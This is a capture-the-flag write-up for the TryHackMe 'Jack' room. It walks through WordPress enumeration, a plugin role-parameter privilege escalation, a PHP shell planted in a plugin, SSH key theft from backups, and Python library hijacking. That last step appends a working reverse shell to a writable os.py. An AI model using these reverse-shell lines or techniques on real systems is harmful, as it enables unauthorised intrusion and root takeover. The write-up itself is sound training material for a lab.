This was an older room when I did it, yet there were only a handful of write-ups. I noticed that they all seem to magically jump to the correct vulnerable Wordpress plugin without a good explanation. I’ve tried to better explain that step and included a couple of options for you. Thanks to the hard workers at [TryHackMe](https://tryhackme.com/p/tryhackme) for this box!

## Enumeration

We start as instructed by adding `jack.thm` to our hosts file, followed by an `nmap` scan:

```terminal

### Enumerate / Foothold Wordpress

Let’s enumerate the Wordpress site. With one pass we can:

- Detect common configuration weaknesses
- Enumerate users and brute-force their passwords
- Scan for known-vulnerable plugins.

>The `--plugins-detection aggressive` flag is important as WPScan doesn’t enumerate all vulnerable plugins by default.

The privesc exploit is simple, we just append **`&ure_other_roles**=**administrator`** to end of profile update post to become wordpress administrator.

We’ll make an update to our profile through the UI, capture the traffic in Zap and the re-send the POST message with our extra parameter at the end. 

![Screenshot 2023-07-21 at 6.44.37 PM.png](/assets/jack/Screenshot_2023-07-21_at_6.44.37_PM.png)

## Get a shell

For this step we’ll need to edit a plugin to contain a remote shell. We’ll use the `hello.php` file we enumerated earlier. 

- Select “Plugin Editor” form the left nav, and the the “Hello Dolly” plugin from the “select plugin to edit” dropdown. 

- Add our php shell to the beginning of the file. It’s important that the plugin is not activated at this point, as we’ll get an error trying to update it.

- Of course, we need to start the appropriate listener on our attacker box.

![Screenshot 2023-07-21 at 7.24.27 PM.png](/assets/jack/Screenshot_2023-07-21_at_7.24.27_PM.png)

We can run this code by activating the plugin in Wordpress or navigating to the php file in our browser at `http://jack.thm/wp-content/plugins/hello.php`.

🏁 Once the shell returns, we can read the user flag from jack’s home directory

## Become Jack

There is a note `reminder.txt` in jack’s directory suggesting we look at file permissions for backups. We quickly find `id_rsa` in `var\backups`.

Copy this file to the www\html folder and download over the web server. Run `chmod -R 600 id_rsa` to make it a valid file for ssh. 

We can now SSH in as Jack.  

## Become root

pspy64 shows python file `/opt/statuscheck/checker.py` being run by root every 2 minutes.

![Screenshot 2023-08-13 at 12.26.13 PM.png](/assets/jack/Screenshot_2023-08-13_at_12.26.13_PM.png)

### Python Library Hijacking

Examining the `checker.py`file we find we can’t modify it, but it does import another file we might be able to tamper with.

```python
import os

os.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")
```
{: .nolineno }

To find which `os.py` module is likely imported by root, we can get the python includes path with:

`python -c "import sys; import pprint; pprint.pprint(sys.path)"`

```bash
jack@jack:/opt/statuscheck$ python -c "import sys; import pprint; pprint.pprint(sys.path)"
['',
 '/usr/lib/python2.7',
 '/usr/lib/python2.7/plat-x86_64-linux-gnu',
 '/usr/lib/python2.7/lib-tk',
 '/usr/lib/python2.7/lib-old',
 '/usr/lib/python2.7/lib-dynload',
 '/usr/local/lib/python2.7/dist-packages',
 '/usr/lib/python2.7/dist-packages']
```
{: .nolineno }

Lucky us, we find a writeable `os.py` file in the first path. 

```bash
jack@jack:/home/jack$ ls -la /usr/lib/python2.7/os.py
-rw-rw-r-x 1 root family 25908 Nov 16  2020 /usr/lib/python2.7/os.py

jack@jack:/home/jack$ groups
jack adm cdrom dip plugdev lpadmin sambashare family
```
{: .nolineno }

We want to add a reverse shell in there but our normal shell imports `os.py`, the same file we’re weaponizing. We need to add our line of code at the very end of the file and dereference the import to avoid a circular reference.

The code we’re going to add is a slightly modified version of our regular Python reverse shell:

```python
import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.1.1",4446));
dup2(s.fileno(),0);dup2(s.fileno(),1);dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
```
{: .nolineno }

The easiest way to add it:

```bash
echo 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.1.1",4446));
> dup2(s.fileno(),0);dup2(s.fileno(),1);dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])' >> /usr/lib/python2.7/os.py
```
{: .nolineno }

🏁 We wait 2 minutes and get a reverse shell on port 4446. From here we can capture the root flag.
